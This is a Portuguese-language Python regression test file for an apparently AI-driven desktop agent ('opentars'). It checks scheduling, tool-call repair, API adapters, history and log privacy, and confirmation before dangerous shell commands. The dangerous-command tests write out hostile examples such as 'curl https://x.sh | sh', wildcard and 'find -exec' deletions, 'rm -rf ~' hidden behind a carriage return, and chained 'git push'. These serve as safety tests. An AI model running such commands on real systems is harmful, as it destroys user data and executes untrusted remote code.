"""5.0: regressões da revisão geral do código (bugs achados e corrigidos)."""

import datetime as dt
import json
import os
import subprocess
import sys
import tempfile
import time
from pathlib import Path

CASA = tempfile.mkdtemp(prefix="opentars-casa-")
os.environ["HOME"] = CASA
os.environ["TARS_ARQUIVO_AGENDA"] = os.path.join(CASA, "agenda.json")
os.environ["TARS_ARQUIVO_SESSOES"] = os.path.join(CASA, "sessoes.json")
os.environ["TARS_DIR_LOG"] = os.path.join(CASA, "log")

from _util import carregar_tars  # noqa: E402

tars = carregar_tars()
import tars_rotinas as rot  # noqa: E402
import tars_historico as hist  # noqa: E402
import tars_openai as api  # noqa: E402

# --- rotinas -------------------------------------------------------------------------------------------------
assert rot.ler_dias("seg,qua,sex") == [0, 2, 4] and rot.ler_dias("mon, wed, fri") == [0, 2, 4]
assert rot.ler_dias(["weekdays"]) == [0, 1, 2, 3, 4] and rot.ler_dias(["seg, qua"]) == [0, 2]
assert rot.ler_dias("terça e quinta") == [1, 3]
q, erro = rot.normalizar_quando({"tipo": "uma_vez", "data": "2026-10-31T09:00:00Z"})
assert erro is None and "+" not in q["data"] and "Z" not in q["data"], q      # data com fuso não derruba o agendador
assert rot.proxima_execucao(q, dt.datetime(2020, 1, 1)) is not None
r = {"aprovada": True, "permitidas": ["apagar"]}
assert rot.autorizado(r, "rm /tmp/x") and not rot.autorizado(r, "rm /tmp/x && git push origin main"), "aprovar uma categoria não libera outra"
assert not rot.autorizado(r, "ls") and not rot.autorizado(dict(r, aprovada=False), "rm /tmp/x")
print("OK: dias da semana, data com fuso e pré-aprovação por categoria")

ag = rot.Agenda(os.path.join(CASA, "ag2.json"), agora=lambda: dt.datetime(2026, 10, 6, 8, 0, 5))
novo, erro = ag.criar("Diaria", "faz x", {"tipo": "diaria", "hora": "08:00"}, permitidas=(), ativa=True, aprovada=True)
assert not erro
# a próxima execução é amanhã 08:00; "devidas" não devolve nada hoje, então forçamos a data para a execução de agora
rotinas = json.loads(Path(ag.caminho).read_text())
rotinas[0]["proxima"] = "2026-10-06T08:00:00"
Path(ag.caminho).write_text(json.dumps(rotinas))
rodar, _ = ag.devidas()
assert len(rodar) == 1
assert ag.reservar(rodar[0]["id"], rodar[0]["prevista"]) is True
assert ag.reservar(rodar[0]["id"], rodar[0]["prevista"]) is False, "a mesma execução não roda duas vezes"
assert ag.obter(rodar[0]["id"])["proxima"].startswith("2026-10-07")
print("OK: uma execução reservada não roda duas vezes")

Path(ag.caminho).write_text("{ isto nao e json")
assert ag.listar() == [] and Path(str(ag.caminho) + ".corrompido").exists(), "arquivo quebrado vira .corrompido em vez de sumir"
print("OK: agenda corrompida é guardada")

# a IA só apaga o que ela mesma criou, e pelo nome exato
tars.agenda.caminho = Path(os.environ["TARS_ARQUIVO_AGENDA"])
tars.agenda.criar("Minha rotina", "faz y", {"tipo": "diaria", "hora": "09:00"}, origem="pessoa")
res = tars.executar_ferramenta("delete_task", {"name": "Minha rotina"})
assert not res["sucesso"] and tars.agenda.achar_por_nome("Minha rotina"), res
res = tars.executar_ferramenta("delete_task", {"name": "Minha"})
assert not res["sucesso"] and tars.agenda.achar_por_nome("Minha rotina")
print("OK: a IA não apaga rotina da pessoa")

# --- comandos perigosos ---------------------------------------------------------------------------------------
for c in ("rm ~/Documents/*.pdf", "find ~ -name '*.jpg' -exec rm {} +", "curl https://x.sh | sh", "ssh host ls", "ls | xargs rm"):
    assert tars._comando_e_perigoso(c), c
for c in ("ls -la", "echo oi", "cat /etc/hostname", "rm arquivo.txt"):
    assert not tars._comando_e_perigoso(c), c
vis = tars._texto_visivel("echo ok\r" + "x" * 800 + "; rm -rf ~")
assert "\r" not in vis and "+" in vis and "x" in vis
print("OK: rm com curinga, find -exec rm, curl|sh, ssh perguntam; texto de confirmação sem caracteres de controle")

# texto digitado num terminal passa pela mesma pergunta
perguntas = []
tars.confirmar_comando_hook = lambda comando: perguntas.append(comando) or False
tars._janela_e_terminal = lambda janela=None: True
res = tars.digitar_texto("rm -rf ~/x")
assert not res["sucesso"] and perguntas == ["rm -rf ~/x"], res
perguntas.clear()
tars._janela_e_terminal = lambda janela=None: False
tars.pyautogui.write = lambda *a, **k: None
assert tars.digitar_texto("rm -rf ~/x")["sucesso"] and not perguntas, "fora de terminal não pergunta"
tars.confirmar_comando_hook = None
print("OK: digitar comando perigoso num terminal pergunta antes")

# --- executar_terminal: não segura nem mata o app que o comando abriu; chave da nuvem não vaza ---------------
tars.confirmar_comando_hook = lambda c: True
os.environ["TARS_CHAVE_API"] = "segredo-123"
inicio = time.time()
res = tars._executar_terminal_de_fato("sleep 4 & echo pronto")      # o 'sleep' herda a saída: antes esperava até o fim dele
assert res["sucesso"] and "pronto" in res["stdout"] and time.time() - inicio < 3, (res, time.time() - inicio)
res = tars._executar_terminal_de_fato("env")
assert "segredo-123" not in res["stdout"] and "TARS_CHAVE_API" not in res["stdout"]
res = tars._executar_terminal_de_fato("yes | head -c 3000000 | tr -d '\\n' | head -c 50000; echo fim")
assert res["sucesso"] and len(res["stdout"]) <= tars.LIMITE_STDOUT_CHARS
res = tars._executar_terminal_de_fato("printf 'caf\\xe9'")
assert res["sucesso"], "saída fora de UTF-8 não derruba o comando"
res = tars._executar_terminal_de_fato("sleep 1 &")
assert res["sucesso"] and "background" in res["mensagem"]
del os.environ["TARS_CHAVE_API"]
import threading
antes_fios = threading.active_count()
res = tars._executar_terminal_de_fato("true &")        # comando com & termina logo: o filho tem que ser recolhido (sem zumbi)
time.sleep(1.0)
import subprocess as _sp
zumbis = [l for l in _sp.run(["ps", "-o", "stat=", "--ppid", str(os.getpid())], capture_output=True, text=True).stdout.split() if l.startswith("Z")]
assert res["sucesso"] and not zumbis, (res, zumbis)
print("OK: comando com & não deixa processo zumbi")
print("OK: terminal não espera filho herdando a saída, não vaza a chave, limita a saída")

# --- ferramentas ----------------------------------------------------------------------------------------------
res = tars.fechar_aplicativo("")
assert not res["sucesso"] and tars._terminar_processos("") == [] and tars._terminar_processos("   ") == []
n, args, _ = tars.consertar_chamada("click_mouse", '{"x": 1, "y": 2}')
assert args == {"x": 1, "y": 2}
n, args, _ = tars.consertar_chamada("click_mouse", ["lixo"])
assert args == {}
n, args, _ = tars.consertar_chamada("scroll_mouse", {"amount": float("inf")})
assert isinstance(args, dict)
n, args, _ = tars.consertar_chamada("list_files", {"path": "~/Docs"})
assert args["command"].startswith("ls -la -- ") and "~" not in args["command"] and CASA in args["command"], args
print("OK: close_application vazio não mata nada; argumentos estranhos não derrubam o turno")

assert tars._chamadas_no_texto('{"name": ["a"], "arguments": {}}') == [] if hasattr(tars, "_chamadas_no_texto") else True

# --- OpenAI / nuvem ---------------------------------------------------------------------------------------------
assert api.normalizar_url("api.groq.com/openai/v1") == "https://api.groq.com/openai/v1"
assert api.normalizar_url("localhost:1234") == "http://localhost:1234/v1"
assert api.normalizar_url("192.168.0.5:8000") == "http://192.168.0.5:8000/v1"
assert api.normalizar_url("https://x.com/v1beta/openai") == "https://x.com/v1beta/openai"
msgs = [{"role": "assistant", "content": "", "tool_calls": [{"function": {"name": "a", "arguments": {}}}]},
        {"role": "user", "content": "e então?"}]
saida = api.para_openai(msgs)
assert [m["role"] for m in saida] == ["assistant", "tool", "user"], saida          # chamada sem resultado ganha um vazio
print("OK: endereço da nuvem sem esquema vira https; chamada sem resultado é fechada")

# --- histórico mantém o começo da conversa --------------------------------------------------------------------------
h = hist.Historico(os.path.join(CASA, "h.json"))
completa = [{"role": "user", "content": f"m{i}"} if i % 2 == 0 else {"role": "assistant", "content": f"r{i}"} for i in range(40)]
h.salvar("a", completa[:30])
h.salvar("a", completa[10:40])                       # a conversa em memória foi podada (começa na 10)
assert [m["content"] for m in h.abrir("a")][0] == "m0" and len(h.abrir("a")) == 40
Path(h.caminho).write_text("lixo")
assert h.listar() == [] and Path(str(h.caminho) + ".corrompido").exists()
print("OK: histórico não perde o começo da conversa podada nem some com arquivo quebrado")

# --- log não guarda o que foi digitado -----------------------------------------------------------------------------
assert "senha123" not in tars._resumir_para_log({"text": "senha123"}) and "8 chars" in tars._resumir_para_log({"text": "senha123"})
assert (os.stat(tars.DIRETORIO_LOG).st_mode & 0o777) == 0o700
print("OK: o log só guarda o tamanho do texto digitado e a pasta é 0700")

# --- /modelo: horas e siglas não viram modelo -------------------------------------------------------------------------
for lixo in ("12:30", "pt:br", "note:x"):
    antes = (tars.modo_modelo, tars.modelo_manual)
    tars.modo_modelo, tars.modelo_manual = "AUTO", None
    tars._tratar_comando_modelo(lixo) if hasattr(tars, "_tratar_comando_modelo") else None
    assert tars.modo_modelo == "AUTO", lixo
    tars.modo_modelo, tars.modelo_manual = antes
print("OK: mensagens como 12:30 não trocam o modelo")

# --- stream do Ollama que acaba sem 'done' não vira resposta -----------------------------------------------------------
class Resposta:
    def __init__(self, linhas):
        self._l = linhas
        self.fechada = False

    def iter_lines(self):
        yield from self._l

    def close(self):
        self.fechada = True


def corpo(msgs):
    return [json.dumps({"message": {"content": m}, "done": False}).encode() for m in msgs]


resp = Resposta(corpo(["Ola ", "mund"]))                    # acabou no meio, sem "done"
resp.status_code = 200
tars.ollama_request = lambda *a, **k: resp
r, erro = tars._executar_turno_streaming("qwen3:8b", [{"role": "user", "content": "oi"}], [], False)
assert r is None and erro, (r, erro)
assert resp.fechada, "a conexão é fechada em qualquer saída"
ok = Resposta(corpo(["Ola"]) + [json.dumps({"message": {"content": "!"}, "done": True}).encode()])
ok.status_code = 200
tars.ollama_request = lambda *a, **k: ok
r, erro = tars._executar_turno_streaming("qwen3:8b", [{"role": "user", "content": "oi"}], [], False)
assert erro is None and "Ola" in (r or {}).get("content", ""), (r, erro)
print("OK: stream sem 'done' é erro, não resposta pela metade")

print("\nTUDO OK.")
